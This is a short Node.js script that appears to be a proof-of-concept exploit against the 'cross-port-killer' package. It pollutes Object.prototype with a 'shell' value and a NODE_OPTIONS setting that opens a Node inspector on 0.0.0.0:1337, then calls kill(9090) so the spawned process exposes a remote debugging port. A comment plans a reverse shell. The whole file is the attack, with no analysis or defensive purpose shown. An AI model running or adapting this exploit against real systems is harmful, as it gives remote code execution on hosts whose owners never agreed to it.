const { kill } = require('cross-port-killer');

Object.prototype.shell = 'node'
Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:1337' };

// TODO: try a reverse shell on Linux

kill(9090).then(pids => {
  console.log(pids)
})